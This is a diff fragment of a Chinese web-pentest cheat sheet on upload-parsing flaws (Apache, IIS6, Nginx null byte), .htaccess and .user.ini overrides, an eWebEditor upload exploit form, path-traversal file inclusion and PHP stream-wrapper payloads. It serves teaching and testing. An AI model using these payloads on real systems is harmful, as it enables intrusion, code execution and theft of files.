<br>2、php.ini里cgi.fix_pathinfo=1(默认为1) <br>3、取消勾选php-cgi.exe程序的”Invoke handler only if request is mapped to” <br>形式：将/xx.jpg/xx.php解析为php文件 <br>4、Nginx解析漏洞 <br>影响版本：<br>0.5，0.6，0.7&lt;=0.7.65，0.8&lt;=0.8.37 <br>原理：<br>在使用PHP-FastCGI执行php的时候，URL里面在遇到%00空字节时与FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码 <br>形式：<br>xxx.jpg%00.php</td>
+<td align="left">1、Apache解析漏洞 <br>&gt;多后缀 apache解析顺序从右到左，若是无法解析，则返回源码。 <br>前提：<br>apache1.x、2.x<br>Apache能够识别的文件在mime.types文件可以查看 <br>形式： <br>a.php.xxx.yyy绕过（黑名单绕过） <br>a.php.7z（可绕过白名单–不在apache解析目录，但是在白名单目录） <br><br>&gt;配置错误 apache配置文件可指定解析后缀类型 <br>&gt;.htaccess apache环境下，当上传文件未拦截.htaccess且未重命名文件时，可上传.htaccess修改apache默认配置  <br><br>2、IIS6.0解析漏洞 <br>&gt;目录解析 <br>形式：<br>/xx.asp/xx.jpg <br>原理：<br>在网站下创建文件夹名字为.asp、.asa的文件夹，其目录内的任何扩展名的文件都被当作asp文件来解析并执行。 <br><br>&gt;文件解析 <br>形式：<br>/xx.asp;.jpg（利用特殊符号”;”）<br>原理：<br>在iis6.0下，服务器默认不解析；号后面的内容，所以xx.asp;.jpg被解析为asp脚本解析漏洞 <br><br>&gt;解析文件类型（属于黑名单绕过方式） <br>形式：<br>/test.asa、/test.cer、/test.cdx <br>原理：<br>iis6.0默认的可执行文件除了asp还包含这三种asa、cer、cdx，会将这三种扩展名文件解析为asp文件  <br><br>3、PHP CGI解析漏洞 <br>IIS7.0/IIS7.5/Nginx&lt;0.8.3畸形解析漏洞 <br>前提： <br>1、Fast-CGI运行模式 <br>2、php.ini里cgi.fix_pathinfo=1(默认为1) <br>3、取消勾选php-cgi.exe程序的”Invoke handler only if request is mapped to” <br>形式：将/xx.jpg/xx.php解析为php文件 <br>4、Nginx解析漏洞 <br>影响版本：<br>0.5，0.6，0.7&lt;=0.7.65，0.8&lt;=0.8.37 <br>原理：<br>在使用PHP-FastCGI执行php的时候，URL里面在遇到%00空字节时与FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码 <br>形式：<br>xxx.jpg%00.php</td>
 <td align="left">&gt;配置错误 <br>AddHandler php5-script .php、<br>AddType application/x-httpd-php .jpg <br><br>&gt;.htaccess <br>AddType application/x-httpd-php xxx 使用php解析.xxx文件 <br><br>或 <br>&lt;FilesMatch .ccc$&gt; SetHandler application/x-httpd-php <br>正则匹配.ccc后缀文件 <br><br>或 <br>&lt;FilesMatch “shell.jpg”&gt; SetHandler application/x-httpd-php <br>指定解析某个文件</td>
 </tr>
 <tr>
@@ -7046,6 +7046,11 @@
 <td align="left">其他类型</td>
 <td align="left"></td>
 <td align="left"></td>
+</tr>
+<tr>
+<td align="left">.user.ini</td>
+<td align="left">自动文件包含，可将jpg解析为php文件，包含于php文件首部，只适用于PHP，7.3版本可用，类似于Apache配置文件.htaccess<br>注意：文件夹下必须有php文件才可生效</td>
+<td align="left">auto_prepend_file=x.jpg <br>注意，文件名必须相同，访问任意php文件即可生效</td>
 </tr>
 <tr>
 <td align="left">00截断</td>
@@ -7163,7 +7168,7 @@
 <p><strong>利用</strong></p>
 <p>1、登录后台，进入样式管理，增加上传类型即可。</p>
 <p>2、访问<code>/admin/ewebEditor/asp/upload.asp?action=save&amp;type=image&amp;style=popup&amp;cusdir=hack.asp</code></p>
-<p>创建hack.asp文件件，此文件夹下文件全部可执行</p>
+<p>创建hack.asp文件夹，此文件夹下文件全部可执行</p>
 <p>检查元素，编辑html</p>
 <pre class="highlight"><span class="line">&lt;form action=&quot;http://192.168.1.1/admin/ewebEditor/asp/upload.asp?		action=save&amp;type=image&amp;style=popup&amp;cusdir=hack.asp&quot; method=post name=myform enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=file name=uploadfile size=100&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=submit value=upload&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre>
 
@@ -7216,10 +7221,10 @@
 <p>2、用户可以动态控制变量</p>
 <p><strong>利用：</strong></p>
 <p>1、获取到系统中的其他文件的内容</p>
-<p>绝对路径：?action=C:\Windows\System32\drivers\etc\hosts</p>
-<p>相对路径：?action=………………\windows\system32\drivers\etc\hosts</p>
+<p>绝对路径：<code>?action=C:\\Windows\\System32\\drivers\\etc\\hosts</code></p>
+<p>相对路径：<code>?action=..\..\..\windows\\system32\\drivers\\etc\\hosts</code></p>
 <p><strong>包含图片马</strong>：</p>
-<p>/action.php?action=./test.jpg</p>
+<p>/action.php?action=test.jpg</p>
 <p><strong>包含日志文件：</strong></p>
 <p>文件路径</p>
 <pre class="highlight"><span class="line">访问日志：</span><br><span class="line">	access_log（在Windows上是access.log）	</span><br><span class="line">错误日志：</span><br><span class="line">	error_log（在Windows上是error.log）</span><br><span class="line">	</span><br><span class="line">默认安装路径：</span><br><span class="line">	CentOS、Redhat、Fedora:/var/log/httpd/</span><br><span class="line">	Ubuntu、Debian、Kali:/var/log/apache2/</span><br><span class="line">源码安装路径：</span><br><span class="line">	/usr/local/apache2/logs/</span><br><span class="line">	</span><br><span class="line">具体可通过配置文件查看与更改</span><br><span class="line">	/etc/httpd/conf/httpd.conf</span><br></pre>
@@ -7286,11 +7291,11 @@
 </tr>
 <tr>
 <td align="left">php://</td>
-<td align="left">访问各个输入/输出流 <br>php://filter <br><br>使用条件： <br>allow_url_fopen：off/on <br>allow_url_include：off/on <br>两个配置都为off的情况下是可以正常使用的  <br><br>使用： <br>[?path=php://filter/read=convert.base64-encode/resource=文件.php] <br><br>注意：<br>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell，但能读取敏感文件。  <br><br>php://filter协议与file://协议的区别：<br>file协议只能使用绝对路径，filter协议相对路径和绝对路径都可以使用PHP伪协议  <br><br>php://input 用途： 可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行 <br>使用条件： allow_url_fopen：off/on allow_url_include：on <br>使用方法： ?file=php://input[POST]： (执行POST DATA中的内容)</td>
+<td align="left">访问各个输入/输出流 <br>php://filter <br><br>使用条件： <br>allow_url_fopen：off/on <br>allow_url_include：off/on <br>两个配置都为off的情况下是可以正常使用的  <br><br>使用： <br>[?path=php://filter/read=convert.base64-encode/resource=文件.php] <br><br>注意：<br>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell，但能读取敏感文件。  <br><br>php://filter协议与file://协议的区别：<br>file协议只能使用绝对路径，filter协议相对路径和绝对路径都可以使用PHP伪协议  <br><br>php://input <br>用途： 可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行 <br>使用条件： <br>allow_url_fopen：off/on <br>allow_url_include：on <br>使用方法： <br>?file=php://input[POST]： (执行POST DATA中的内容)</td>
 </tr>
 <tr>
 <td align="left">zip://</td>
-<td align="left">用途： <br>读取zip压缩包内容 <br>使用条件： <br>allow_url_fopen = off/on allow_rul_include=off/on <br><br>使用方法： <br>?file=zip://D:/soft/phpstudy/www/file.zip%23phpcode.txt <br>若是zip后缀被禁用，可直接改zip后缀为jpg后缀，继续使用zip协议访问</td>
+<td align="left">用途： <br>读取zip压缩包内容 <br>使用条件： <br>allow_url_fopen = off/on <br>allow_rul_include=off/on <br><br>使用方法： <br>?file=zip://D:/soft/phpstudy/www/file.zip%23phpcode.txt <br>若是zip后缀被禁用，可直接改zip后缀为jpg后缀，继续使用zip协议访问</td>
 </tr>
 <tr>
 <td align="left">phar://</td>
